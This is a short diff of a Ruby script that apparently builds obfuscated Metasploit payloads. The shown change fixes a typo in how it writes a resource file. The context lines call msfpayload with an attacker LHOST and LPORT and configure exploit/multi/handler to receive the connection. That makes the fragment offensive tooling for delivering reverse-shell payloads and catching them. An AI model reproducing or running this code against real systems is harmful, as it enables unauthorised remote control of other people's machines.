@@ -127,7 +127,7 @@ if payload_num < 5
   %x{msfpayload #{payload_name} LHOST=#{LHOST} LPORT=#{LPORT} R > #{raw_file}}
   #Making the rc file
   rc = File.new("obfy.rc", "w+")
-  pc.puts "sleep 3"
+  rc.puts "sleep 3"
   rc.puts "use exploit/multi/handler"
   rc.puts "set payload #{payload_name}"
   rc.puts "set LHOST #{LHOST}"
